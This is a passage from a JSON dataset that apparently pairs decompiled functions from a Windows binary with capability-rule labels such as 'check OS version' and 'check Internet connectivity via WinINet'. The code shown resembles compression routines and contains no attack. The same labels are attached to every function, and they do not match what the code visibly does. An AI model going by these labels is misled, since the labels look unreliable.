0x28) < *(iVar1 + 0x24)) {\n                *(iVar1 + 0x28) = *(iVar1 + 0x28) + uVar5;\n            }\n        }\n        else {\n            fcn.004676d0(*(iVar1 + 0x30), *(in_EAX + 0xc) - iVar2, iVar2);\n            *(iVar1 + 0x2c) = iVar2;\n            *(iVar1 + 0x28) = *(iVar1 + 0x24);\n        }\n    }\n    else {\n        fcn.004676d0(*(iVar1 + 0x30), *(in_EAX + 0xc) - uVar5, uVar5);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = *(iVar1 + 0x24);\n    }\n    uVar3 = 0;\ncode_r0x00469b8b:\n    return CONCAT44(in_EAX, uVar3);\n}\n",
        "token_count": 702
    },
    "0046aa4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046aa4c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        if (*(*(in_EAX + 0x1c) + 0x30) != 0) {\n            (**(in_EAX + 0x24))();\n        }\n        (**(in_EAX + 0x24))();\n        *(in_EAX + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 148
    },
    "0046adbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0046adbc(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    int32_t in_EAX;\n    uint *puVar5;\n    uint uVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint32_t in_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    uint16_t *in_EDX;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint16_t var_84h;\n    uint var_82h;\n    uint var_64h;\n    uint16_t *var_46h;\n    int32_t var_40h;\n    uint16_t *var_3ch;\n    uint16_t *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    puVar5 = &var_64h;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    do {\n        *puVar5 = 0;\n        var_ch = var_ch + 1;\n        puVar5 = puVar5 + 2;\n    } while (var_ch < 0x10);\n    uVar11 = 0;\n    puVar7 = var_8h;\n    if (in_ECX != 0) {\n        do {\n            uVar3 = *puVar7;\n            puVar7 = puVar7 + 1;\n            uVar11 = uVar11 + 1;\n            piVar1 = &var_64h + uVar3 * 2;\n            *piVar1 = *piVar1 + 1;\n        } while (uVar11 < in_ECX);\n    }\n    puVar5 = &var_46h;\n    var_18h = *arg_ch;\n    var_14h = 0xf;\n    do {\n        if (*puVar5 != 0) break;\n        var_14h = var_14h - 1;\n        puVar5 = puVar5 + -2;\n    } while (var_14h != 0);\n    if (var_14h < *arg_ch) {\n        var_18h = var_14h;\n    }\n    if (var_14h == 0) {\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        uVar6 = 0;\n        *arg_ch = 1;\n    }\n    else {\n        var_10h = 1;\n        stack0xffffffb8 = &var_64h + 2;\n        do {\n            if (*stack0xffffffb8 != 0) break;\n            var_10h = var_10h + 1;\n            stack0xffffffb8 = stack0xffffffb8 + 1;\n        } while (var_10h < 0x10);\n        if (var_18h < var_10h) {\n            var_18h = var_10h;\n        }\n        var_ch = 1;\n        iVar12 = 1;\n        puVar7 = &var_64h + 2;\n        do {\n            iVar12 = iVar12 * 2 - *puVar7;\n            if (iVar12 < 0) {\n                return 0xffffffff;\n            }\n            var_ch = var_ch + 1;\n            puVar7 = puVar7 + 1;\n        } while (var_ch < 0x10);\n        if ((iVar12 < 1) || ((var_4h != 0 && (var_14h == 1)))) {\n            var_82h._0_2_ = 0;\n            var_ch = 1;\n            puVar5 = &var_82h;\n            stack0xffffffb8 = &var_64h + 2;\n            do {\n                *(puVar5 + 2) = *puVar5 + *stack0xffffffb8;\n                puVar5 = puVar5 + 2;\n                var_ch = var_ch + 1;\n                stack0xffffffb8 = stack0xffffffb8 + 1;\n            } while (var_ch < 0xf);\n            uVar11 = 0;\n            stack0xffffffb8 = var_8h;\n            if (in_ECX != 0) {\n                do {\n                    uVar3 = *stack0xffffffb8;\n                    if (uVar3 != 0) {\n                        uVar2 = (&var_84h)[uVar3];\n                        (&var_84h)[uVar3] = (&var_84h)[uVar3] + 1;\n                        arg_8h[uVar2] = uVar11;\n                    }\n                    uVar11 = uVar11 + 1;\n                    stack0xffffffb8 = stack0xffffffb8 + 1;\n                } while (uVar11 < in_ECX);\n            }\n            if (var_4h == 0) {\n                var_3ch = arg_8h;\n                var_38h = arg_8h;\n                var_40h = 0x13;\n            }\n            else if (var_4h == 1) {\n                var_38h = 0x493432;\n                var_3ch = 0x493470;\n                var_40h = 0x100;\n            }\n            else {\n                var_38h = 0x4936b0;\n                var_3ch = 0x4936f0;\n                var_40h = -1;\n            }\n            var_ch = var_10h;\n            uVar11 = 0;\n            var_34h = *arg_10h;\n            var_1ch = 0;\n            var_28h = 0xffffffff;\n            var_20h = 1 << (var_18h & 0x1f);\n            var_2ch = var_20h - 1;\n            if ((var_4h != 1) || (var_20h < 0x5b0)) {\n                stack0xffffffb8 = arg_8h;\n                uVar8 = var_18h;\n                while( true ) {\n                    do {\n                        uVar4 = var_ch;\n                        uVar10 = var_ch - var_1ch;\n                        uVar13 = *stack0xffffffb8;\n                        if (uVar13 < var_40h) {\n                            var_30h = uVar10 << 8;\n                            var_30h = var_30h | *stack0xffffffb8 << 0x10;\n                        }\n                        else if (var_40h < uVar13) {\n                            var_30h = CONCAT22(var_38h[uVar13], CONCAT11(uVar10, *(var_3ch + uVar13)));\n                        }\n                        else {\n                            var_30h = CONCAT31(uVar10, 0x60);\n                        }\n                        var_24h = 1 << (uVar8 & 0x1f);\n                        var_10h = var_24h;\n                        do {\n                            var_24h = var_24h - (1 << (var_ch - var_1ch & 0x1f));\n                            *(var_34h + ((uVar11 >> (var_1ch & 0x1f)) + var_24h) * 4) = var_30h;\n                        } while (var_24h != 0);\n                        for (uVar13 = 1 << (var_ch - 1U & 0x1f); (uVar13 & uVar11) != 0; uVar13 = uVar13 >> 1) {\n                        }\n                        if (uVar13 == 0) {\n                            uVar11 = 0;\n                        }\n                        else {\n                            uVar11 = (uVar11 & uVar13 - 1) + uVar13;\n                        }\n                        stack0xffffffb8 = stack0xffffffb8 + 1;\n                        piVar1 = &var_64h + var_ch * 2;\n                        *piVar1 = *piVar1 + -1;\n                        if (*(&var_64h + uVar4 * 2) == 0) {\n                            if (var_ch == var_14h) {\n                                var_30h._0_2_ = CONCAT11(var_ch - var_1ch, 0x40);\n                                var_30h = var_30h;\n                                while (uVar11 != 0) {\n                                    if ((var_1ch != 0) && ((var_2ch & uVar11) != var_28h)) {\n                                        var_1ch = 0;\n                                        var_ch = var_18h;\n                                        var_34h = *arg_10h;\n                                        var_30h._0_2_ = CONCAT11(var_18h, var_30h);\n                                        var_30h = var_30h;\n                                    }\n                                    *(var_34h + (uVar11 >> (var_1ch & 0x1f)) * 4) = var_30h;\n                                    for (uVar8 = 1 << (var_ch - 1U & 0x1f); (uVar8 & uVar11) != 0; uVar8 = uVar8 >> 1) {\n                                    }\n                                    if (uVar8 == 0) {\n                                        uVar11 = 0;\n                                    }\n                                    else {\n                                        uVar11 = (uVar11 & uVar8 - 1) + uVar8;\n                                    }\n                                }\n                                *arg_10h = *arg_10h + var_20h * 4;\n                                *arg_ch = var_18h;\n                                return 0;\n                            }\n                            var_ch = var_8h[*stack0xffffffb8];\n                        }\n                    } while ((var_ch <= var_18h) || ((var_2ch & uVar11) == var_28h));\n                    if (var_1ch == 0) {\n                        var_1ch = var_18h;\n                    }\n                    var_34h = var_34h + var_10h * 4;\n                    uVar8 = var_ch - var_1ch;\n                    for (iVar12 = 1 << (uVar8 & 0x1f);\n                        (var_1ch + uVar8 < var_14h &&\n                        (iVar12 = iVar12 - *(&var_64h + (var_1ch + uVar8) * 2),  0 < iVar12)); iVar12 = iVar12 * 2) {\n                        uVar8 = uVar8 + 1;\n                    }\n                    var_20h = var_20h + (1 << (uVar8 & 0x1f));\n                    if ((var_4h == 1) && (0x5af < var_20h)) break;\n                    var_28h = var_2ch & uVar11;\n                    iVar12 = *arg_10h;\n                    *(iVar12 + var_28h * 4) = uVar8;\n                    *(iVar12 + 1 + var_28h * 4) = var_18h;\n                    iVar9 = var_34h - iVar12;\n                    if (iVar9 < 0) {\n                        iVar9 = iVar9 + 3;\n                    }\n                    *(iVar12 + 2 + var_28h * 4) = iVar9 >> 2;\n                }\n                return 1;\n            }\n            uVar6 = 1;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 2739
    },
    "0046b400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b400(uint param_1, int32_t *param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t *piVar7;\n    ushort *puVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    iVar3 = param_2[1];\n    iVar4 = *param_2;\n    piVar7 = param_2[2];\n    iVar12 = *piVar7;\n    iVar5 = piVar7[1];\n    iVar6 = piVar7[2];\n    uVar13 = piVar7[4];\n    iStack24 = 0;\n    iVar10 = 0;\n    puVar8 = in_EAX + 0xb38;\n    do {\n        *puVar8 = 0;\n        iVar10 = iVar10 + 1;\n        puVar8 = puVar8 + 1;\n    } while (iVar10 < 0x10);\n    *(iVar4 + 2 + *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) * 4) = 0;\n    iStack36 = *(in_EAX + 0x1450) + 1;\n    piVar7 = in_EAX + 0xb58 + iStack36 * 4;\n    for (; iStack36 < 0x23d; iStack36 = iStack36 + 1) {\n        iVar10 = *piVar7;\n        uVar11 = *(iVar4 + 2 + *(iVar4 + 2 + iVar10 * 4) * 4) + 1;\n        if (uVar13 < uVar11) {\n            iStack24 = iStack24 + 1;\n            uVar11 = uVar13;\n        }\n        *(iVar4 + 2 + iVar10 * 4) = uVar11;\n        if (iVar10 <= iVar3) {\n            piVar9 = in_EAX + 0xb38 + uVar11 * 2;\n            *piVar9 = *piVar9 + 1;\n            iStack32 = 0;\n            if (iVar6 <= iVar10) {\n                iStack32 = *(iVar5 + (iVar10 - iVar6) * 4);\n            }\n            uVar2 = *(iVar4 + iVar10 * 4);\n            *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + uVar2 * (uVar11 + iStack32);\n            if (iVar12 != 0) {\n                *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) + (*(iVar12 + 2 + iVar10 * 4) + iStack32) * uVar2;\n            }\n        }\n        piVar7 = piVar7 + 1;\n    }\n    if (iStack24 != 0) {\n        do {\n            iVar12 = uVar13 - 1;\n            for (piVar9 = in_EAX + 0xb38 + iVar12 * 2; *piVar9 == 0; piVar9 = piVar9 + -1) {\n                iVar12 = iVar12 + -1;\n            }\n            piVar9 = in_EAX + 0xb38 + iVar12 * 2;\n            *piVar9 = *piVar9 + -1;\n            piVar9 = in_EAX + 0xb3a + iVar12 * 2;\n            *piVar9 = *piVar9 + 2;\n            piVar9 = in_EAX + 0xb38 + uVar13 * 2;\n            *piVar9 = *piVar9 + -1;\n            iStack24 = iStack24 + -2;\n        } while (0 < iStack24);\n        puVar1 = in_EAX + 0xb38 + uVar13 * 2;\n        for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n            uVar11 = *puVar1;\n            while (piVar7 = in_EAX + 0xb58 + iStack36 * 4,  uVar11 != 0) {\n                while( true ) {\n                    iStack36 = iStack36 + -1;\n                    piVar7 = piVar7 + -1;\n                    iVar12 = *piVar7;\n                    if (iVar3 < iVar12) break;\n                    if (*(iVar4 + 2 + iVar12 * 4) != uVar13) {\n                        *(in_EAX + 0x16a4) =\n                             *(in_EAX + 0x16a4) + (uVar13 - *(iVar4 + 2 + iVar12 * 4)) * *(iVar4 + iVar12 * 4);\n                        *(iVar4 + 2 + iVar12 * 4) = uVar13;\n                    }\n                    uVar11 = uVar11 - 1;\n                    if (uVar11 == 0) goto code_r0x0046b5ed;\n                }\n            }\ncode_r0x0046b5ed:\n            puVar1 = puVar1 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 1230
    },
    "0046b670": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b670(uint param_1, int16_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    int16_t *piVar5;\n    char cVar6;\n    uchar *puVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piStack20;\n    \n    piVar8 = NULL;\n    piVar3 = *param_2;\n    iVar9 = *param_2[2];\n    puVar7 = in_EAX + 0x1454;\n    iVar10 = *(param_2[2] + 0xc);\n    piStack20 = 0xffffffff;\n    *(in_EAX + 0x144c) = 0;\n    *(in_EAX + 0x1450) = 0x23d;\n    piVar5 = piVar3;\n    if (0 < iVar10) {\n        do {\n            if (*piVar5 == 0) {\n                piVar5[1] = 0;\n            }\n            else {\n                *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n                *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar8;\n                *puVar7 = 0;\n                piStack20 = piVar8;\n            }\n            piVar8 = piVar8 + 1;\n            puVar7 = puVar7 + 1;\n            piVar5 = piVar5 + 2;\n        } while (piVar8 < iVar10);\n    }\n    while (*(in_EAX + 0x144c) < 2) {\n        if (piStack20 < 2) {\n            piVar5 = piStack20 + 1;\n            piStack20 = piVar5;\n        }\n        else {\n            piVar5 = NULL;\n        }\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar5;\n        piVar3[piVar5 * 2] = 1;\n        *(in_EAX + 0x1454 + piVar5) = 0;\n        *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + -1;\n        if (iVar9 != 0) {\n            *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) - *(iVar9 + 2 + piVar5 * 4);\n        }\n    }\n    param_2[1] = piStack20;\n    iVar9 = *(in_EAX + 0x144c) >> 1;\n    if (iVar9 < 0) {\n        iVar9 = iVar9 + ((*(in_EAX + 0x144c) & 1) != 0);\n    }\n    for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n        fcn.0046b30c();\n    }\n    do {\n        iVar9 = *(in_EAX + 0x144c);\n        iVar4 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + -1;\n        *(in_EAX + 0xb5c) = *(in_EAX + 0xb58 + iVar9 * 4);\n        fcn.0046b30c();\n        iVar9 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar4;\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar9;\n        piVar3[iVar10 * 2] = piVar3[iVar9 * 2] + piVar3[iVar4 * 2];\n        uVar2 = *(in_EAX + 0x1454 + iVar9);\n        puVar1 = in_EAX + 0x1454 + iVar4;\n        if (uVar2 < *puVar1 || uVar2 == *puVar1) {\n            cVar6 = *(in_EAX + 0x1454 + iVar4);\n        }\n        else {\n            cVar6 = *(in_EAX + 0x1454 + iVar9);\n        }\n        *(in_EAX + 0x1454 + iVar10) = cVar6 + '\\x01';\n        piVar3[iVar9 * 2 + 1] = iVar10;\n        piVar3[iVar4 * 2 + 1] = iVar10;\n        *(in_EAX + 0xb5c) = iVar10;\n        iVar10 = iVar10 + 1;\n        fcn.0046b30c();\n    } while (1 < *(in_EAX + 0x144c));\n    *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n    *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = *(in_EAX + 0xb5c);\n    fcn.0046b400();\n    fcn.0046b600();\n    return;\n}\n",
        "token_count": 1309
    },
    "0046c014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046c014(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    fcn.0046b880();\n    fcn.0046b880();\n    fcn.0046b670();\n    iVar1 = 0x12;\n    puVar2 = 0x493eca;\n    do {\n        if (*(in_EAX + 0xa7a + *puVar2 * 4) != 0) break;\n        iVar1 = iVar1 + -1;\n        puVar2 = puVar2 + -1;\n    } while (2 < iVar1);\n    *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + iVar1 * 3 + 0x11;\n    return;\n}\n",
        "token_count": 187
    },
    "0046c9d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046c9d0(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    uint32_t uStack32;\n    \n    uStack32 = 0;\n    if (*(in_EAX + 0x169c) != 0) {\n        do {\n            uVar7 = *(*(in_EAX + 0x16a0) + uStack32 * 2);\n            uVar9 = *(*(in_EAX + 0x1694) + uStack32);\n            uStack32 = uStack32 + 1;\n            if (uVar7 == 0) {\n                uVar7 = *(param_2 + 2 + uVar9 * 4);\n                if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + uVar9 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + uVar9 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n                }\n            }\n            else {\n                uVar6 = *(uVar9 + 0x4940cb);\n                uVar5 = *(param_2 + 0x406 + uVar6 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + 0x404 + uVar6 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) =\n                         *(in_EAX + 0x16b4) | *(param_2 + 0x404 + uVar6 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar6 * 4 + 0x493760);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar6 * 4 + 0x493d90);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n                uVar9 = uVar7 - 1;\n                if (uVar9 < 0x100) {\n                    uVar1 = *(uVar7 + 0x493eca);\n                }\n                else {\n                    uVar1 = *((uVar9 >> 7) + 0x493fcb);\n                }\n                uVar7 = uVar1;\n                uVar5 = *(param_1 + 2 + uVar7 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_1 + uVar7 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_1 + uVar7 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar7 * 4 + 0x4937d4);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar7 * 4 + 0x493e04);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n            }\n        } while (uStack32 < *(in_EAX + 0x169c));\n    }\n    uVar7 = *(param_2 + 0x402);\n    if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n        uVar2 = *(param_2 + 0x400);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + 0x400) << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n    }\n    *(in_EAX + 0x16b0) = *(param_2 + 0x402);\n    return;\n}\n",
        "token_count": 2957
    },
    "0046ce90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046ce90(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x24;\n    do {\n        if (*piVar1 != 0) break;\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 9);\n    if (iVar2 == 9) {\n        iVar2 = 0xe;\n        piVar1 = in_EAX + 0x32;\n        do {\n            if (*piVar1 != 0) break;\n            iVar2 = iVar2 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 < 0x20);\n    }\n    *(*in_EAX + 0x2c) = iVar2 == 0x20;\n    return;\n}\n",
        "token_count": 214
    },
    "0046cf6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046cf6c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) < 9) {\n        if (0 < *(in_EAX + 0x16b8)) {\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        }\n    }\n    else {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n    }\n    *(in_EAX + 0x16b4) = 0;\n    *(in_EAX + 0x16b8) = 0;\n    return;\n}\n",
        "token_count": 318
    },
    "0046cfd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
